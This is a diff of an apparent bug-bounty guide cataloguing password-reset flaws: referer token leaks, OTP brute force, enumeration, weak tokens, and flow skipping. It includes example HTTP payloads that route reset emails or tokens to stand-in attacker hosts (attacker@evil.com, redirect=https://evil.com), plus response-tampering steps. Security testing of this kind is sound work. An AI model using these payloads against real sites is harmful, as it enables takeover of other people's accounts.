@@ -1,69 +1,95 @@
-# Common security flaws in password reset functionality compiled from twitter, writeups, disclosed reports:
+# Password Reset Flaws — Expanded Catalog
 
-## 1. Password Reset Token Leak Via Referrer
+Common security flaws in password reset functionality, compiled from Twitter, writeups, and disclosed reports. This file is the **index of flaw classes**; the full payloads and step-by-step exploitation for the core five live in `Top_5_Password_Reset_Bugs.md`, and adjacent behaviors are distributed across the files linked inline. Use it to plan one pass per flaw class.
 
-- The HTTP referer is an optional HTTP header field that identifies the address of the webpage which is linked to the resource being requested.
-The Referer request header contains the address of the previous web page from which a link to the currently requested page was followed 
+## Hunting Checklist
 
-Exploitation:
-```
-    Request password reset to your email address
-    Click on the password reset link
-    Dont change password
-    Click any 3rd party websites(eg: Facebook, twitter)
-    Intercept the request in burpsuite proxy
-    Check if the referer header is leaking password reset token.
-``` 
-  
-## 2. Sending an array of email addresses instead of a single email address.
+1. Run `Top_5_Password_Reset_Bugs.md` items 1–5 first (they cover the highest-hit-rate flaws):
+   - Token leak via `Referer`
+   - Email array/param injection
+   - Reset OTP brute force
+   - Change-password API accepting another user's identity
+   - Client-trusted error responses
+2. Then sweep this catalog for the remaining classes below (enumeration, entropy, expiry, auth-scope, redirect, multi-step skipping).
+3. For each attempt, record both the request and response — most reset findings are proven from the delta.
 
-- In this attack the The attacker can send a password reset link to an arbitrary email by sending an array of email addresses instead of a single email address and It could lead to full account takeover.
+## Test Cases & Examples
 
-```
-POST https://example.com/api/v1/password_reset HTTP/1.1
-Original Request Body:
-{“email_address”:”xyz@gmail.com”}
-Modified Request Body:
-{“email_address”:[“admin@breadcrumb.com”,”attacker@evil.com”]}
-```
-- In this way, the password reset link get send to both victim as well as attacker. And the attacker can use it to gain Full account Takeover.
+### 1–5. Core Five
+Full exploitation steps and payloads: see `Top_5_Password_Reset_Bugs.md` §§1–5 (same numbering). Quick recall of the *signal* to look for:
+- #1: token appears in an outbound `Referer` header.
+- #2: backend accepts `{"email_address":["victim","attacker"]}`.
+- #3: OTP endpoint has no rate limit/lockout.
+- #4: `/api/changepass` accepts `email` from the body.
+- #5: SPA advances flow when the proxied response is rewritten to success.
 
-## 3. Bruteforcing OTP for Reseting Password.
+### 6. Username/Account Enumeration via Reset
+Compare responses of a reset request for an existing vs non-existing address:
+```http
+POST /api/forgot-password HTTP/1.1
+Content-Type: application/json
 
-- Now, In case The password reset functionality of application is based on OTP validation.
-- Many program accepts No rate limit as acceptable risk. So, Bruteforcing OTP is worth trying.
-- You can reset the password of an account by intercepting the request for OTP validation and bruteforcing the 6 digit number.
-- Using this, it is possible to change and reset the password of any account, by changing the user data and brute-forcing the reset OTP.
-  
-Exploitation:
+{"email":"doesnotexist@example.com"}
 ```
-      1. Start the Burp Suite and Intercept the password reset request
-      2.Send to intruder
-      3.Use null payload
+```json
+{"error":"No account found for this email"}
 ```
+Distinct status/body/timing ⇒ valid-email list an attacker can feed into #3/#5 and credential attacks.
 
-## 4. Full Account Takeover via Changing Email And Password of any User through API Parameters
+### 7. Token Predictability / Low Entropy
+Collect several tokens for different accounts/times and look for structure:
+```
+2026-09-10 + userid + md5 → sequential, short, base32-only, or decodable JWT with alg=none
+```
+Predictable tokens make reset links stealable without any other bug (test against your own account only).
 
-Exploitation:
-```
-    1. Attacker have to login with their account and Go to the Change password function
-    2. Start the Burp Suite and Intercept the request
-    3. After intercepting the request sent it to repeater and modify parameters Email and Password
-      POST /api/changepass
-      [...]
-      ("form": {"email":"victim@email.tld","password":"12345678"})
-```      
-      
-      
-## 5. Response manipulation: Replace Bad Response With Good One
+### 8. Token Sent to the Wrong/Requester-Controlled Address
+Request a reset, then tamper for a second "to" address:
+```http
+POST /api/forgot-password HTTP/1.1
+Content-Type: application/json
 
-- Look for Request and Response like these
+{"email":"victim@example.com","cc":"attacker@evil.com","forward_to":"attacker@evil.com"}
 ```
-HTTP/1.1 401 Unauthorized
-(“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”)
+Same class: CRLF header injection in the email param (payloads in `Account_Takeover_By_Password_Reset_Functionality.md`).
+
+### 9. Multi-Step Flow Skipping / Broken Object Reference
+If step N+1 is a plain endpoint:
+```http
+GET /reset/step2?token=<yours> HTTP/1.1
 ```
-- Change Response
+- Try skipping earlier steps (visit final form directly).
+- Swap `token`, `user_id`, `uuid` between two of *your* accounts to test object-level binding.
+
+### 10. Redirect After Reset Not Validated / Token Forwarded
+The reset endpoint completes then redirects; if the next URL is attacker-controlled, the token can be carried away:
+```http
+GET /reset/confirm?token=<token>&redirect=https://evil.com HTTP/1.1
 ```
-HTTP/1.1 200 OK
-(“message”:”success”,”statusCode:200,”errorDescription”:”Success”)
-```
+Also test `?next=`, `?url=`, `?returnurl=` on every step.
+
+### 11. HTTP Verb & Status Trust Variants
+- Retry failed steps with `PUT/PATCH/DELETE` or `_method=` override.
+- Rewrite `4xx` reset responses to `200 OK` for clients that check status only (pattern of #5).
+
+## Bypass Techniques
+
+- Token *expiry/invalidation* gaps (old token still valid after use, after re-request, after email change): procedures in `Broken_Auth_And_Session_Management/Session_based_bugs.md` §§6–8.
+- Token *leakage* channels beyond referrer (analytics/3rd-party domains, API responses): `Password_Reset_Token_Leakage.md`.
+- Host-header poisoning of emailed links: `Account_Takeovers_Methodologies/Account_Takeovers_Methods.md` §3.
+- Email-param HPP/pipe/CRLF variants: `Account_Takeover_By_Password_Reset_Functionality.md`.
+
+## Tools & Resources
+
+- Burp Suite (Intruder, Repeater, Match-and-Replace), browser dev tools (Network) for third-party requests on the reset page.
+- [Password reset flaws mindmap](https://twitter.com/N008x/status/1302515523557548032/photo/1) + [source blog](https://anugrahsr.github.io/posts/10-Password-reset-flaws/) — see `README.md` in this folder.
+
+## Report Tips
+
+- Work the catalog as a matrix (step × flaw class); note negative results — triage likes "tested, not present".
+- Enumeration (#6) is usually P4 alone, but report it chained: enumeration + no rate limit (#3) = mass takeover path.
+- Keep one PoC video per flaw class; don't mix token leakage and parameter pollution in the same demo.
+
+## Credits
+
+- [Sm4rty](https://twitter.com/Sm4rty_) — original flaw list; expanded catalog for HowToHunt.
